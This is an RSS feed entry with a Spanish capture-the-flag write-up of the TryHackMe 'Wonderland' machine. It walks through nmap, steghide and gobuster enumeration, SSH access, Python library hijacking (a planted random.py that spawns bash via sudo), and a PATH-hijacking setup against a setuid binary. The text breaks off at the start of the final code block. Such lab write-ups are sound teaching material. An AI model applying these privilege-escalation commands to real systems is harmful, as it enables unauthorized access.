<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>hijacking PATH on sckull</title>
    <link>https://sckull.github.io/tags/hijacking-path/</link>
    <description>Recent content in hijacking PATH on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Tue, 01 Sep 2020 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/hijacking-path/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>TryHackMe - Wonderland</title>
        <link>https://sckull.github.io/posts/wonderland/</link>
        <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 01 Sep 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/wonderland/</guid>
        <description>Wonderland es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Wonderland es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Wonderland&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Fall down the rabbit hole and enter wonderland.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;130&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Sep  1 00:47:40 2020 as: nmap -Pn -sV -o mini_scan wonderland.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; wonderland.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.220.104&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Golang net/http server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Go-IPFS json-rpc or InfluxDB API&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Sep  1 00:49:59 2020 -- 1 IP address (1 host up) scanned in 138.96 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_22-56-30.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una imagen en la pagina, la descargamos, analizamos y encontramos un archivo dentro de la imagen el cual nos da una pista.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/wonderland$ steghide info white_rabbit_1.jpg 
&lt;span class=&#34;s2&#34;&gt;&amp;#34;white_rabbit_1.jpg&amp;#34;&lt;/span&gt;:
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y/n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y
Enter passphrase: 
  embedded file &lt;span class=&#34;s2&#34;&gt;&amp;#34;hint.txt&amp;#34;&lt;/span&gt;:
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
kali@kali:~/thm/wonderland$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;hint.txt&amp;#34;&lt;/span&gt;.
kali@kali:~/thm/wonderland$ cat hint.txt 
follow the r a b b i t
kali@kali:~/thm/wonderland$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/wonderland$ gobuster dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/r &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;steganografia&#34;&gt;STEGANOGRAFIA&lt;/h4&gt;
&lt;p&gt;En &lt;code&gt;/img&lt;/code&gt; encontramos dos imagenes nuevas, utilizamos steghide y binwalk pero no encontramos nada interesante dentro de estas imagenes.&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/r&lt;/code&gt; solo encontramos una frase, ejecutamos gobuster nuevamente en este directorio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-04-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos &lt;code&gt;/r/a&lt;/code&gt; y nuevamente una frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-07-59.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos nuevamente una frase en &lt;code&gt;/r/a/b/&lt;/code&gt; al pasarle gobuster &lt;code&gt;/r/a/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-10-50.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al pasarle nuevamente a &lt;code&gt;/r/a/b/&lt;/code&gt; encontramos &lt;code&gt;/r/a/b/b/&lt;/code&gt; lo cual indica que la palabra que forma estos directorios es &lt;code&gt;rabbit&lt;/code&gt; el cual es la pista que encontramos en la imagen. Al visitar &lt;code&gt;/r/a/b/b/i/t/&lt;/code&gt; vemos una nueva pagina con una imagen nueva.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-15-29.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además vemos lo que parecen ser unas credenciales escondidas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-16-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;alice---user&#34;&gt;ALICE - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell con la usuario Alice.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-20-57.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que podemos ejecutar python3 con el script &lt;code&gt;walrus_and_the_carpenter.py&lt;/code&gt; con el usuario &lt;code&gt;rabbit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-44-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:walrus_and_the_carpenter.py&#34; data-lang=&#34;python:walrus_and_the_carpenter.py&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;poem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;The sun was shining on the sea,
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Shining with all his might:
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;He did his very best to make
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;The billows smooth and bright —
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;And this was odd, because it was
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;The middle of the night.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[... REDACTED ...]
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;O Oysters,&amp;#34; said the Carpenter.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You’ve had a pleasant run!
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Shall we be trotting home again?&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;But answer came there none —
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;And that was scarcely odd, because
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;They’d eaten every one.&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;choice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;poem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;The line was:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos tambien a &lt;code&gt;perl&lt;/code&gt; con &amp;ldquo;capabilites&amp;rdquo; pero al intentar utilizar este nos mostró que no tenemos permisos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-41-48.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rabbit---user&#34;&gt;RABBIT - USER&lt;/h2&gt;
&lt;p&gt;El script importa la libreria &lt;code&gt;random&lt;/code&gt;, por lo cual se podria realizar &lt;a href=&#34;https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&#34;&gt;&lt;strong&gt;Python Library Hijacking&lt;/strong&gt;&lt;/a&gt;. Intentamos crear el archivo &lt;code&gt;import.py&lt;/code&gt; con una shell inversa dentro, ejecutamos &lt;code&gt;sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py&lt;/code&gt; pero la shell moría al conectarse. Ya que tenemos una shell ssh, ejecutamos &lt;code&gt;/bin/bash&lt;/code&gt; el cual nos devolveria una shell con el usuario rabbit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;import os; os.system(&amp;#39;/bin/bash&amp;#39;);&amp;#34;&lt;/span&gt; &amp;gt; random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-11-14.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con este archivo y encontramos &lt;code&gt;teaParty&lt;/code&gt; el cual copiamos a nuestra maquina para analizarlo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-13-51.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ejecutar &lt;code&gt;strings&lt;/code&gt; vemos que posiblemente se realiza una ejecucion de &lt;code&gt;echo&lt;/code&gt; y &lt;code&gt;date&lt;/code&gt;, pero hay que tomar encuenta que &lt;code&gt;echo&lt;/code&gt; lleva el PATH/direccion del mismo y &lt;code&gt;date&lt;/code&gt; no.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-14-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El codigo fuente generado por &lt;code&gt;Ghidra&lt;/code&gt; nos indica que si realiza la ejecucion de &lt;code&gt;echo&lt;/code&gt; y &lt;code&gt;date&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3eb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3eb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Welcome to the tea party!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;The Mad Hatter will be here soon.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/echo -n &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;Probably by &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; &amp;amp;&amp;amp; date --date=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;next hour&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; -R&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Ask very nicely, and I will give you some tea while you wait for him&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;getchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Segmentation fault (core dumped)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Primero, intentamos utilizar nuevamente &lt;code&gt;perl&lt;/code&gt; pero, no tenemos permiso.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-45-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;hatter---user&#34;&gt;HATTER - USER&lt;/h2&gt;
&lt;p&gt;Realizamos &lt;code&gt;&amp;quot;Hijacking PATH&amp;quot;&lt;/code&gt;, el objetivo es &lt;code&gt;date&lt;/code&gt; ya que toma el &lt;code&gt;$PATH/date&lt;/code&gt; actual del usuario que lo ejecuta. Para ello modificamos la variable &lt;code&gt;$PATH&lt;/code&gt; agregando al principio una direccion a conveniencia, en este caso el directorio principal de &lt;code&gt;rabbit&lt;/code&gt; en el que seguidamente creamos el archivo &lt;code&gt;date&lt;/code&gt; el cual ejecutará &lt;code&gt;/bin/bash&lt;/code&gt; y para finalizar hacemos ejecutable tal archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
